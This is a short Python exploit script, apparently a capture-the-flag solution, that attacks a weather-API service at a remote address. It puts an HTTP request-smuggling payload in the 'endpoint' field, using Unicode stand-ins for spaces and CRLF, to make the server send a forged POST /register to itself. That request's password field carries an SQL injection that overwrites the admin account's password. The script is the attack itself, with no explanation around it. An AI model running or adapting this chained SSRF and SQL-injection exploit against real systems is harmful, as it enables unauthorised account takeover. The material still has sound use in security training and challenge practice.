import requests

url_local = "http://127.0.0.1:80"
url = 'http://159.65.56.112:31521'

username = 'admin'
password = "123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"

encode_username = username.replace("'", "%27").replace('"', "%22").replace(" ", "\u0120")
encode_password = password.replace("'", "%27").replace('"', "%22").replace(" ", "\u0120")

# print(encode_username)
# print(encode_password)

content_length = len(encode_username) + len(encode_password) + 19

endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(content_length) + '\u010D\u010A\u010D\u010Ausername=' + encode_username + '&password=' + encode_password + '\u010D\u010A\u010D\u010AGET\u0120/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1'

r = requests.post(url + '/api/weather', json = {'endpoint':endpoint, 'city':'ok', 'country':'Viet Nam'})
